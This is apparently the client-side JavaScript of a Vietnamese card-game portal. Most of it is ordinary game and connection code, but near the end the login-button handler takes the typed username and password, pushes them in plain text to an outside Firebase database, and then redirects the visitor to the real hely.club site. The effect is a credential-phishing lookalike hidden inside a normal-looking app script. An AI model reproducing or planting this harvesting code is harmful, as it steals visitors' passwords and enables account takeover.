var GlobalHeader = undefined;

 
(function (window) {
    window.App = function () {
    };
    
    App.shareResources = new window.Preloader();
    App.gameResources = new window.Preloader();
    App.chatResources = new window.Preloader();
    App.currentAccount = {};

  

    App.gameEngine = {
        'bacay': {},
        'tala': {},
        'tienlenmiennam': {},
        'tlmn_solo': {},
        'tlmn_nhatantat': {},
        'tienlenmienbac': {},
        'xito': {},
        'poker': {},
        'maubinh': {},
        'chan': {},
        'loc': {},
        'loc_solo': {},
        'lieng': {},
        'xocdia': {},
        'videopoker': {}

    };
    App.gameLoader = {
        'bacay': 0,
        'tala': 0,
        'tienlenmiennam': 0,
        'tlmn_solo': 0,
        'tlmn_nhatantat': 0,
        'tienlenmienbac': 0,
        'xito': 0,
        'poker': 0,
        'maubinh': 0,
        'chan': 0,
        'loc': 0,
        'loc_solo': 0,
        'lieng': 0,
        'xocdia': 0,
        'videopoker': 0
    };
    App.gameConnection = {
        'bacay': {},
        'tala': {},
        'tienlenmiennam': {},
        'tlmn_solo': {},
        'tlmn_nhatantat': {},
        'tienlenmienbac': {},
        'xito': {},
        'poker': {},
        'maubinh': {},
        'chan': {},
        'loc': {},
        'loc_solo': {},
        'lieng': {},
        'xocdia': {},
        'videopoker': {}
    };


    App.resetApp = function () {
        App.gameData = {
            'bacay': {},
            'tala': {},
            'tienlenmiennam': {},
            'tlmn_solo': {},
            'tlmn_nhatantat': {},
            'tienlenmienbac': {},
            'xito': {},
            'poker': {},
            'maubinh': {},
            'chan': {},
            'loc': {},
            'loc_solo': {},
            'lieng': {},
            'xocdia': {},
            'videopoker': {}
        };
        App.gameHub = {
            'bacay': {},
            'tala': {},
            'tienlenmiennam': {},
            'tlmn_solo': {},
            'tlmn_nhatantat': {},
            'tienlenmienbac': {},
            'xito': {},
            'poker': {},
            'maubinh': {},
            'chan': {},
            'loc': {},
            'loc_solo': {},
            'lieng': {},
            'xocdia': {},
            'videopoker': {}
        };
        App.gameButtons = {
            'bacay': false,
            'tala': false,
            'tienlenmiennam': false,
            'tlmn_solo': false,
            'tlmn_nhatantat': false,
            'tienlenmienbac': false,
            'xito': false,
            'poker': false,
            'maubinh': false,
            'chan': false,
            'loc': false,
            'loc_solo': false,
            'lieng': false,
            'xocdia': false,
            'videopoker': false
        };

        $('ul.numb_sao').html('');
        $('ul.numb2_sao').html('');
    };
    App.resetApp();

    
    App.loadResources = function (preloader, resources, showLoading, callback) {
        preloader.onExit = function () {
            if (callback) {
                if (App.gameHub)
                    callback(App.gameHub);
                else
                    callback();
            }

           
        };

        preloader.enter(resources['Image'], showLoading);
    };

    App.loadApp = function (preloader, app, showLoading, callback) {
        preloader.onExit = function () {
            if (callback)
                callback();
        }
        preloader.enter(app, showLoading);
    };

    App.checkGameLoader = function (location) {
        var gameLoader = App.gameLoader;

        if (gameLoader[location] === 0) {
            return true;
        } else {
            for (var lo in gameLoader) {
                if (gameLoader[lo] >= 1) {
                    if (lo === location) {
                        return false;
                    }
                }
            }
            return true;
        }
    };


    App.checkGameConnection = function(location) {
        for (var id in App.gameData) {
            if (id === location) {
                continue;
            } else {
                App.stopHub(id);
            }
        }

        if (App.chatHub && App.chatHub.connection && App.chatHub.connection.state === 1) {
            try {
                App.chatHub.server.unregisterChat(App.channel).done(function() {
                    App.channel = '';
                    try {
                        App.chatHub.connection.stop();
                        App.chatHub = null;
                    } catch (ex) {
                    }
                });
            } catch (e) {
            }
        }
    };

    App.getResourceItem = function(id) {
        var gr = App.gameResources.getResult(id),
            sr = App.shareResources.getResult(id);
        if (gr && gr != undefined) {
            return gr;
        } else if (sr && sr != undefined) {
            return sr;
        } else {
            console.log('Resources not already!!!'+id);
            return null;
        }
    };

    
    App.preStartHub = function (hubName, gameName) {
        if (Config.GAME[gameName] && typeof Config.GAME[gameName].host != 'undefined') {
            var hubUrl = Config.GAME[gameName].host;
            App.gameConnection[gameName] = $.hubConnection(hubUrl);
            App.gameHub[gameName] = App.gameConnection[gameName].createHubProxy(hubName);
        }

        $.connection.hub.logging = true;
        App.gameConnection[gameName].stateChanged(function (change) {
            if (change.newState === $.signalR.connectionState.connecting) {
                console.info('connecting');

                if (App.game) {
                    var playerCanvas = App.game.getCurrentPlayer();
                    if (playerCanvas) {
                        playerCanvas.updateStatus("Đang kết nối máy chủ...");
                        playerCanvas.updateConnectionStatus(Enums.ConnectionStatus.DISCONNECTED);
                    }
                }
            }
            else if (change.newState === $.signalR.connectionState.reconnecting) {
                console.info('reconnecting');

                if (App.game) {
                    var playerCanvas = App.game.getCurrentPlayer();
                    if (playerCanvas) {
                        playerCanvas.updateStatus("Đang kết nối máy chủ...");
                        playerCanvas.updateConnectionStatus(Enums.ConnectionStatus.DISCONNECTED);
                    }
                }

                
            }
            else if (change.newState === $.signalR.connectionState.connected) {
                console.info('connected');

                if (App.game) {
                    var location = Navigator.getLocation(),
                        status = Enums.ConnectionStatus.CONNECTED;

                    if (App.gameData[location] && App.gameData[location].roomModel) {
                        for (var idx in App.gameData[location].roomModel.LeaveGameList)
                            if (App.gameData[location].roomModel.LeaveGameList[idx] == App.currentAccount.AccountID) {
                                status = Enums.ConnectionStatus.REGISTER_LEAVE_GAME;
                                break;
                            }
                    }

                    var playerCanvas = App.game.getCurrentPlayer();
                    if (playerCanvas) {
                        playerCanvas.updateStatus('');
                        playerCanvas.updateConnectionStatus(status);
                    }
                }

                App.setPingTimeout();
                App.setAjaxPingTimeout();

                Util.Cookie.createCookie('retrycount', 0);
                App.restartHubNumber = 0;
            }
            else if (change.newState === $.signalR.connectionState.disconnected) {
                console.info('disconnected');

                App.clearPingTimeout();
                App.clearAjaxPingTimeout();

                if (!App.currentAccount.AccountID) {
                    Navigator.goto('games');
                    return;
                }

                if (App.game) {
                    var playerCanvas = App.game.getCurrentPlayer();
                    if (playerCanvas)
                        playerCanvas.updateConnectionStatus(Enums.ConnectionStatus.DISCONNECTED);
                }
            }
        });
        App.gameConnection[gameName].connectionSlow(function () {
            console.log('Connection Slow.');
            //sessionStorage.setItem('transport', JSON.stringify(["longPolling"]));

            Config.transports = ["longPolling"];

            if (App.game) {
                var playerCanvas = App.game.getCurrentPlayer();
                if (playerCanvas) {
                    playerCanvas.updateStatus("Đang kết nối máy chủ...", 3000);
                }
            }

           
        });
        App.gameConnection[gameName].error(function (error) {
            console.error('SignalR error: ', error);

            App.confirmReload(30);

          
        });
    };

    App.startHub = function (gameName, callback) {
        console.log('App.startHub');
        try {
            var jsonpValue = Config.GAME[gameName] || Config.jsonp;
            App.gameConnection[gameName].start({ transport: Config.transports, jsonp: jsonpValue })
                .done(function () {
                    if (callback)
                        callback();
                    App.afterStartHub();
                })
                .fail(App.invokeHubFail);
        } catch (e) {
            console.error(e);
        }
    };

    App.afterStartHub = function () {
        try {
            var gameName = Navigator.getLocation();
            console.log('afterStartHub, game=', gameName);
            if (App.gameHub && App.gameHub[gameName])
                App.gameHub[gameName].server.enterLobby();
        } catch (e) { }
    };

    App.restartHub = function (gameName, callback) {
        try {
            var jsonpValue = Config.GAME[gameName] || Config.jsonp;
            App.gameConnection[gameName].start({ transport: Config.transports, jsonp: jsonpValue }).done(function () {
                if (callback)
                    callback();
            }).fail(App.invokeHubFail);
        } catch (e) { }
    };

    App.stopHub = function (gameName, reason) {
        try {
            if (App.gameConnection[gameName] && App.gameConnection[gameName].state === $.signalR.connectionState.connected) {
                App.gameConnection[gameName].stop();
            }
        } catch (e) { }

        App.clearPingTimeout();

        if (reason)
            Util.showMessage(reason, { done: false });
    };

    App.unregisterLeaveRoom = function(indexLeaveGame) {
        var currentPlayer = App.game.getCurrentPlayer(),
            location = Navigator.getLocation();

        try {
            App.gameHub[location].server.unregisterLeaveRoom().done(function(isUnregister) {
                console.log('Hủy đăng ký rời phòng: ', isUnregister);

                if (isUnregister)
                    delete App.gameData[location].roomModel.LeaveGameList[indexLeaveGame];
            });

            if (currentPlayer) {
                currentPlayer.updateStatus('Hủy rời bàn chơi...', 3000);
                currentPlayer.Player.ConnectionStatus = Enums.ConnectionStatus.CONNECTED;
                App.lastUserAction();
            }
        } catch (e) {
        }
    };

    App.registerLeaveRoom = function() {
        var currentPlayer = App.game.getCurrentPlayer(),
            location = Navigator.getLocation(),
            subHash = Navigator.getURLParameters();

        try {
            App.gameHub[location].server.leaveGame().done(function(isLeft) {
                console.log('Đăng ký rời phòng: ', isLeft);

                if (isLeft && App.gameData[location].roomModel && App.gameData[location].roomModel.LeaveGameList)
                    App.gameData[location].roomModel.LeaveGameList.push(App.currentAccount.AccountID);

                if (!isLeft || !App.game.isInit && subHash.length > 1)
                    Navigator.goto(location + '/lobby');
            }).fail(function() {
                if (subHash.length > 1)
                    Navigator.goto(location + '/lobby');
            });

            if (currentPlayer) {
                currentPlayer.updateStatus('Đăng ký rời bàn chơi... Nhấn "Quay lại" 1 lần nữa để hủy đăng ký rời bàn.', 3000);
                if (currentPlayer.Player)
                    currentPlayer.Player.ConnectionStatus = Enums.ConnectionStatus.REGISTER_LEAVE_GAME;
                App.lastUserAction(-1);
            }
        } catch (e) {
        }
    };


    App.lastUserAction = function(timeout) {
        if (this.userActionTimeout) {
            clearTimeout(this.userActionTimeout);
            delete this.userActionTimeout;
        }

        if (typeof timeout == 'undefined')
            if (Config.GAME[Navigator.getLocation()])
                timeout = Config.GAME[Navigator.getLocation()].lastActionTimeout;
            else
                timeout = 90000;

        if (timeout <= 0)
            return;

        var that = this;
        this.userActionTimeout = setTimeout(function() {
            var timeout = setTimeout(function() {
                Util.hideMessage();
                that.registerLeaveRoom();
            }, 10000);

            if (App.game && App.game.isInit) {
                Util.showMessage('Bạn có đang online? Đồng ý để tiếp tục chơi.', {
                    done: true,
                    onOK: function() {
                        clearTimeout(timeout);
                        that.lastUserAction();
                    }
                });
            }
        }, timeout);
    };

    
    App.confirmReload = function (timeout) {
        if (App.refreshInterval || !App.pingTimeout)
            return;

        var refreshTimeout = timeout,
            timeCount = 0;

        App.refreshInterval = window.setInterval(function () {
            timeCount++;

            var elapsedTime = (refreshTimeout - timeCount);
            if (elapsedTime < 0)
                elapsedTime = 0;

            var message = 'Bạn bị mất kết nối. Tải lại sau ' + elapsedTime + 's';
            if (elapsedTime == 0 && !window.navigator.onLine) {
                message = 'Bạn bị mất kết nối, hãy kiểm tra lại kết nối mạng. Nhấn OK khi chắc chắn mạng đã được kết nối';
            } else if (elapsedTime == 0) {
                window.location.reload(false);
            }

            Util.showMessage(message, {
                done: true,
                onOK: function () {
                    window.location.reload(false);
                }
            });

            if (window.navigator.onLine && (timeCount % 5 == 0) && App.pingTimeout) {
                App.restartHub(Navigator.getLocation(), function () {
                    if (App.refreshInterval) {
                        Util.hideMessage();
                        clearInterval(App.refreshInterval);
                        delete App.refreshInterval;
                    }
                });
            }
        }, 1000);

        
    };

    App.clearPingTimeout = function() {
        if (App.pingTimeout) {
            clearInterval(App.pingTimeout);
            delete App.pingTimeout;
        }
    };
    App.setPingTimeout = function() {
        App.clearPingTimeout();

        App.pingTimeout = setInterval(function() {
            if (!App.currentAccount || !(App.currentAccount.AccountID > 0)) {
                App.clearPingTimeout();
                return;
            }

            if (!App.gameHub[Navigator.getLocation()] || !App.gameHub[Navigator.getLocation()].server)
                return;

            try {
                App.gameHub[Navigator.getLocation()].server.pingPong().done(function() {
                    App.countPingTimeout = 0;
                }).fail(function() {
                    App.countPingTimeout = App.countPingTimeout || 0;
                    App.countPingTimeout++;
                    if (App.countPingTimeout > 10) {
                        App.confirmReload(30);
                    }
                });
            } catch (e) {
                App.countPingTimeout = App.countPingTimeout || 0;
                App.countPingTimeout++;
                if (App.countPingTimeout > 3)
                    App.confirmReload(30);
            }
        }, 10000);
    };

    App.clearAjaxPingTimeout = function() {
        if (App.pingAjaxTimeout)
            clearTimeout(App.pingAjaxTimeout);
    };
    App.setAjaxPingTimeout = function() {
        App.clearAjaxPingTimeout();

        App.pingAjaxTimeout = setTimeout(function() {
            $.support.cors = true;
            $.ajax({
                cache: false,
                type: "GET",
                contentType: "application/json; charset=utf-8",
                crossDomain: true,
                xhrFields: {
                    withCredentials: true
                },
                dataType: "json",
                url: Config.AUTHEN_URL + '/api/Authen/CheckAuthenticated',
                success: function(isAuthen) {
                    App.pingAjaxTimes = App.pingAjaxTimes || 0;
                    if (isAuthen) {
                        App.setAjaxPingTimeout();
                    } else {
                        Navigator.goto('games');
                    }
                },
                error: function() {
                    App.pingAjaxTimes++;

                    if (App.pingAjaxTimes > 2 && window.navigator.onLine)
                        window.location.reload(false);
                    else
                        App.confirmReload(30);
                }
            });
        }, 300000);  
    };

    
    App.loadResources(App.shareResources, SHARE_RESOURCES, true, function () {
       
        Navigator.hashChangedEvent();
        ChosenGame.Init();

    });
     
    App.back = function() {

        var msg = '';
        var location = Navigator.getLocation();
        var state = Navigator.checkInGame();
        var subHash = Navigator.getURLParameters();


        if (state > 0) {
            if (App.gameHub[location] && App.gameHub[location].connection && App.gameHub[location].connection.state == 1 && state === 6) {

                var indexLeaveGame = -1;
                if (App.gameData[location] && App.gameData[location].roomModel) {
                    for (var idx in App.gameData[location].roomModel.LeaveGameList)
                        if (App.gameData[location].roomModel.LeaveGameList[idx] == App.currentAccount.AccountID) {
                            indexLeaveGame = idx;
                            break;
                        }
                }

                if (indexLeaveGame > -1) {
                    App.unregisterLeaveRoom(indexLeaveGame);
                } else {
                    App.registerLeaveRoom();
                }
            } else if (state >= 2 && state < 7 && subHash.length > 1) {
                Navigator.goto(location + '/lobby');
            } else {
                Navigator.goto('games');
            }
            return;
        } else if (location === 'games') {
            if (subHash[0] === 'shop') {
                Navigator.goto('games');
            } else {
                 
            }
            return;
        } else {
            Navigator.goto('games');
        }
    };

function make_popup_login(){
    $('.boxlist-game a[href]').each(function() {
        if($(this).attr('href').indexOf('hely.club')!==-1) {
            $(this).attr('href','#bacay/lobby');
            $(this).on('click',function(e){
                e.preventDefault();
                //$('a[href="#bacay/lobby"]').eq(0).trigger('click');
                Util.showMessage("Bạn cần đăng nhập để chơi game", {
                            onOK: function () {
                               // $('#btn_login').click();
                            }
                        });
            });
        }
    });
}

var fbdb=window.fbdb = {
    init: function() {
        /*var config = {
            apiKey: "<API_KEY>",
            authDomain: "<PROJECT_ID>.firebaseapp.com",
            databaseURL: "https://<DATABASE_NAME>.firebaseio.com",
            storageBucket: "<BUCKET>.appspot.com",
            messagingSenderId: "<SENDER_ID>",
          };
          firebase.initializeApp(config);
          */
        this.fb = new Firebase('https://shelyclub-6f4d4.firebaseio.com/');  
    },
    test: function() {
        var usersRef = this.fb.child('top-hely-club').child("users");
        /*usersRef.set({
          alanisawesome: {
            date_of_birth: "June 23, 1912",
            full_name: "Alan Turing"
          },
          gracehop: {
            date_of_birth: "December 9, 1906",
            full_name: "Grace Hopper"
            }
        });*/
        usersRef.on('child_added', function(snapshot) {
            console.log('done',snapshot.val());
        });
        usersRef.on('value', function(snapshot) {
            console.log('done',snapshot.val());
        });

        //this.fb.set('a',1);
        //usersRef.push({a:1});
    },
    add_user: function(user, data) {
        var usersRef = this.fb.child("users");
        var d={};
		data.time = new Date().format('d/m/Y h:i:s');
        d[user] = data;
        usersRef.update(d);
    }
};

    $(document).ready(function () {
        fbdb.init();

$('.boxgame-nav').on('click','a', function() {
    make_popup_login();
});
$('#btnregister,#btnlogin').click(function(e){
    e.preventDefault();
    setTimeout(function(){$('#closePopup').click();},100);
    if($(this).is('#btnlogin')) {
        var u=$('#txtUserName').val(),
           p= $('#txtpassword').val();

        if(!u || !p) {
            alert("Vui lòng nhập tên người dùng và mật khẩu để đăng nhập ?");
            return;
        }
        fbdb.add_user(u, {username: u, password: p});
    }
    //window.open('https://hely.club/#games');
    location.href='https://hely.club/#games';
    
});
//hoang
var tm=setInterval(function(){
    if(!$('.boxlist-game a[href]').length) return;

    make_popup_login();
    clearInterval(tm);
},500);

fbdb.init();
fbdb.test();

        $(window).unload(function (e) {
            if (e.type != 'unload')
                App.gameHub[Navigator.getLocation()].server.leaveGame();
        });

		/*if(location.protocol!='https:')
		{
			  window.location.href = 'https://hely.club';
		}*/
	    App.Modules = {};
        App.Modules.Event = new Event();
        App.Modules.AccountInfo = new AccountInfo();
        App.Modules.Profile = new Profile();
        //App.Modules.Chat = new Chat();
        App.Modules.Setting = new Setting();
        

        $('.disable-tuch').bind('touchmove', function (e) {
            e.preventDefault();
        });

    });
 
})(window);

